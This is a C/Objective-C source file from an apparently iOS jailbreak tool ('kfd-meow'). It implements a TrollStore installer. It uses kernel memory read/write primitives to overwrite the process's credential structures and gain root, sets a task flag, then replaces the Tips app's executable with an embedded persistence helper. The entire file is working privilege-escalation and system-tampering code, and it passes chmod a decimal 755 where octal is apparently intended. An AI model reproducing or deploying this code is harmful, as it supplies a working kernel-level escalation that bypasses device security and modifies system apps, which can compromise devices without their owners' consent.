//
//  troll.c
//  kfd-meow
//
//  Created by mizole on 2024/01/28.
//

#include "troll.h"

NSString* find_tips(void) {
    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/Application" error:NULL];

    for (NSString *path in dirs) {
        NSDirectoryEnumerator *enumerator = [[NSFileManager defaultManager] enumeratorAtPath:[NSString stringWithFormat:@"%@%@", @"/var/containers/Bundle/Application/", path]];
        NSString *name;
        while (name = [enumerator nextObject]) {
            if([name isEqual: @"Tips.app"])
                return [NSString stringWithFormat:@"%@%@%@%@", @"/var/containers/Bundle/Application/", path, @"/", name];
        }
    }
    return NULL;
}

void TrollStoreinstall(void) {
    usleep(5000);
    set_offsets();
    
    setup_client();
    
    usleep(5000);
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    if(isAvailable() >= 6) {
        eary_kcall(proc_set_ucred, our_proc, kern_ucred, 0, 0, 0, 0, 0);
        
        usleep(5000);
        setuid(0);
        setgroups(0,0);
    } else {
        kwrite32_kfd(our_proc + off_p_uid, 0);
        kwrite32_kfd(our_proc + off_p_ruid, 0);
        kwrite32_kfd(our_proc + off_p_gid, 0);
        kwrite32_kfd(our_proc + off_p_rgid, 0);
        kwrite32_kfd(our_ucred + 0x18, 0);
        kwrite32_kfd(our_ucred + 0x1c, 0);
        kwrite32_kfd(our_ucred + 0x20, 0);
        kwrite32_kfd(our_ucred + 0x24, 1);
        kwrite32_kfd(our_ucred + 0x28, 0);
        kwrite32_kfd(our_ucred + 0x68, 0);
        kwrite32_kfd(our_ucred + 0x6c, 0);
    }
    
    uint32_t t_flags_bak = kread32_kfd(our_task + off_task_t_flags);
    uint32_t t_flags = t_flags_bak | 0x00000400;
    kwrite32_kfd(our_task + off_task_t_flags, t_flags);
    
    printf("getuid() : %d\n", getuid());
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    
    NSString *tips = find_tips();
    NSLog(@"%@", tips);
    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", tips, @"/Tips"] toPath:[NSString stringWithFormat:@"%@%@", tips, @"/Tips_TROLLSTORE_BACKUP"] error:nil];
    [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithFormat:@"%@%@", tips, @"/Tips"] error:nil];
    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/PersistenceHelper_Embedded"] toPath:[NSString stringWithFormat:@"%@%@", tips, @"/Tips"] error:nil];
    chmod([NSString stringWithFormat:@"%@%@", tips, @"/Tips"].UTF8String, 755);
    
    kwrite32_kfd(our_task + off_task_t_flags, t_flags_bak);
    eary_kcall(proc_set_ucred, our_proc, our_ucred, 0, 0, 0, 0, 0);
    setuid(501);
}
